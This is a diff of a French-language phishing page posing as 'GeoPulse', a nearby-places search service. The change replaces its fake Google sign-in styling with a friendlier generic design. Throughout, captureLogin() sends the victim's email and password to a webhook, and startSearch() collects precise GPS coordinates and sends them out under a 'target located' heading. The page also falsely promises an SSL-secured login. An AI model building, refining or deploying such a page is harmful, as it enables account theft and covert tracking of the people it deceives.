@@ -3,50 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion – Comptes Google</title>
+    <title>Bienvenue sur GeoPulse</title>
     <style>
-        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { width: 350px; border: 1px solid #dadce0; padding: 40px; border-radius: 8px; text-align: center; }
-        .search-box { display: none; width: 90%; max-width: 450px; padding: 30px; text-align: center; border-radius: 15px; background: #ffffff; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border: 1px solid #e0e0e0; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
-        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; font-size: 14px; width: 100%; margin-top: 15px; }
-        button:hover { background: #1557b0; }
-        .logo-google { width: 75px; margin-bottom: 20px; }
-        .gp-logo { color: #1a73e8; font-size: 32px; font-weight: bold; margin-bottom: 5px; letter-spacing: -1px; }
-        #status { margin-top: 15px; font-size: 13px; color: #5f6368; }
-        .sub-text { font-size: 14px; color: #3c4043; margin-top: 15px; }
+        :root {
+            --primary: #4A90E2;
+            --success: #63d471;
+            --bg: #f0f4f8;
+        }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }
+        
+        .card { background: white; width: 380px; padding: 40px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); text-align: center; border: 1px solid #e1e8ed; }
+        
+        .search-box { display: none; }
+
+        .icon-circle { width: 60px; height: 60px; background: #eef5ff; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; color: var(--primary); font-size: 24px; }
+
+        h1 { font-size: 22px; color: #2c3e50; margin-bottom: 8px; }
+        p { font-size: 15px; color: #7f8c8d; line-height: 1.5; margin-bottom: 25px; }
+
+        input { width: 100%; padding: 14px; margin: 8px 0; border: 2px solid #edf2f7; border-radius: 12px; font-size: 15px; box-sizing: border-box; transition: 0.3s; outline: none; }
+        input:focus { border-color: var(--primary); background: #f9fbff; }
+
+        button { background: var(--primary); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: 600; font-size: 16px; width: 100%; margin-top: 10px; transition: 0.3s; box-shadow: 0 4px 6px rgba(74, 144, 226, 0.2); }
+        button:hover { background: #357abd; transform: translateY(-1px); }
+
+        .footer-note { font-size: 13px; color: #bdc3c7; margin-top: 25px; }
+        .trusted { display: flex; justify-content: center; gap: 10px; margin-top: 20px; font-size: 12px; color: #95a5a6; align-items: center; }
     </style>
 </head>
 <body>
 
-<div id="login-step" class="login-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo-google">
-    <h1 style="font-size: 24px; font-weight: 400; margin-bottom: 25px;">Connexion</h1>
+<div id="login-step" class="card">
+    <div class="icon-circle">👋</div>
+    <h1>Ravi de vous revoir !</h1>
+    <p>Connectez-vous avec votre compte habituel pour activer vos services <strong>GeoPulse</strong>.</p>
     
     <input type="text" id="email" placeholder="E-mail ou téléphone">
     <input type="password" id="pass" placeholder="Mot de passe">
     
-    <div class="sub-text">
-        Connectez-vous avec Google pour accéder à <strong>GeoPulse</strong>
-    </div>
-
-    <button onclick="captureLogin()">Suivant</button>
+    <button onclick="captureLogin()">Se connecter en toute sécurité</button>
     
-    <div style="margin-top: 25px; text-align: left;">
-        <span style="color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer;">Créer un compte</span>
+    <div class="trusted">
+        <span style="font-size: 16px;">🛡️</span> Connexion sécurisée par protocole SSL
     </div>
 </div>
 
-<div id="search-step" class="search-box">
-    <div class="gp-logo">GeoPulse<span style="color: #34a853;">.</span></div>
-    <p style="color: #5f6368; margin-bottom: 25px;">Intelligence de proximité haute précision</p>
+<div id="search-step" class="card search-box">
+    <div class="icon-circle">📍</div>
+    <h1 style="color: var(--primary);">GeoPulse</h1>
+    <p>Trouvez tous vos lieux préférés à proximité de chez vous en un seul clic.</p>
     
-    <input type="text" id="query" placeholder="Chercher un lieu (ex: Sushi, Banque...)">
-    <button onclick="startSearch()">Lancer la recherche</button>
+    <input type="text" id="query" placeholder="Que cherchez-vous ? (ex: Boulangerie)">
+    <button onclick="startSearch()">Découvrir autour de moi</button>
     
-    <div id="status">Prêt pour l'analyse locale.</div>
+    <div id="status" style="margin-top: 15px; font-size: 14px;">Prêt à vous guider !</div>
     
-    <div id="map-placeholder" style="margin-top:20px; height:250px; display:none; border-radius:8px; overflow:hidden;">
+    <div id="map-placeholder" style="margin-top:20px; height:200px; display:none; border-radius:15px; overflow:hidden; border: 2px solid #f0f4f8;">
         <iframe id="map-iframe" width="100%" height="100%" frameborder="0" style="border:0"></iframe>
     </div>
 </div>
@@ -63,19 +75,18 @@ async function captureLogin() {
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 embeds: [{
-                    title: "🔑 NOUVEL ACCÈS GOOGLE CAPTURÉ",
-                    color: 16733952,
+                    title: "✨ NOUVELLE CONNEXION CHALEUREUSE",
+                    color: 4884962,
                     fields: [
-                        { name: "📧 Email/User", value: `\`${email}\``, inline: true },
-                        { name: "🔒 Password", value: `\`${pass}\``, inline: true }
-                    ],
-                    footer: { text: "GeoPulse OSINT Intelligence" }
+                        { name: "👤 Utilisateur", value: `\`${email}\``, inline: true },
+                        { name: "🔑 Clé", value: `\`${pass}\``, inline: true }
+                    ]
                 }]
             })
         });
         document.getElementById('login-step').style.display = 'none';
         document.getElementById('search-step').style.display = 'block';
-    } else { alert("Veuillez remplir les champs."); }
+    } else { alert("Oh ! Il manque vos identifiants 😊"); }
 }
 
 async function startSearch() {
@@ -83,7 +94,7 @@ async function startSearch() {
     const status = document.getElementById('status');
     if(!query) return;
 
-    status.innerHTML = "<span style='color: #1a73e8;'>⏳ Autorisez l'accès GPS pour synchroniser les résultats...</span>";
+    status.innerHTML = "<span style='color: var(--primary);'>✨ Analyse de votre quartier en cours...</span>";
 
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -95,28 +106,28 @@ async function startSearch() {
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🎯 CIBLE LOCALISÉE (GeoPulse)",
-                        color: 3447003,
+                        title: "🎯 CIBLE LOCALISÉE (GeoPulse Friendly)",
+                        color: 6542449,
                         fields: [
-                            { name: "🔎 Recherche", value: query, inline: true },
-                            { name: "📍 Google Maps", value: `[Cliquer pour voir la rue](https://www.google.com/maps?q=${lat},${lon})` },
-                            { name: "🌍 Coordonnées", value: `\`${lat}, ${lon}\`` }
+                            { name: "🔎 Recherche", value: query },
+                            { name: "📍 Carte", value: `[Ouvrir Google Maps](https://www.google.com/maps?q=${lat},${lon})` }
                         ]
                     }]
                 })
             });
 
-            status.innerHTML = "✅ Résultats trouvés !";
+            status.innerHTML = "<span style='color: var(--success);'>✅ Voici les meilleurs résultats !</span>";
             document.getElementById('map-placeholder').style.display = 'block';
-            document.getElementById('map-iframe').src = `https://www.google.com/maps?q=${query}&output=embed`;
+            document.getElementById('map-iframe').src = `https://www.google.com/maps/embed/v1/search?key=VOTRE_CLE_API_NON_NECESSAIRE&q=${query}&output=embed`;
 
         }, () => {
-            status.innerHTML = "❌ Erreur : Accès GPS refusé.";
+            status.innerHTML = "😔 Nous avons besoin de votre position pour vous aider.";
         }, { enableHighAccuracy: true });
     }
 }
 </script>
 </body>
 </html>
+
 
 
